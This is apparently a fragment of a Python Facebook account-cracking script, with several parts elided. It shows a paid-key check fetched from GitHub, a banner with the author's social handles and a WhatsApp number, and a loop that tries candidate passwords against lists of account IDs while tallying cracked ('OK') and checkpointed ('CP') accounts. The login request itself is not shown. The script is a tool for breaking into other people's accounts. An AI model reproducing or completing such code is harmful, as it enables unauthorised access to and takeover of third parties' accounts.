...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰𝐑𝐀𝐈𝐇𝐀𝐍\•\_____❹⓿❹ ;* :) 3:)")
	subprocess.check_output(["am", "start", "https://m.me/100003899241148"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Prince890890ww/PAID/blob/main/Approble.txt').text
			if basesplit in plr:
				key = basesplit
...
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : 𝐑𝐀𝐈𝐇𝐀𝐍\•\_____❹⓿❹ ;* :) 3:)
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : EMOTION-আবেগ💔🥀
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : RA1H4N
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01618921827
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [RAIHAN_OLD] : %s/%s -> \033[0;92m [ R140N-OK:%s ]- \033[0;91m[R140N-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
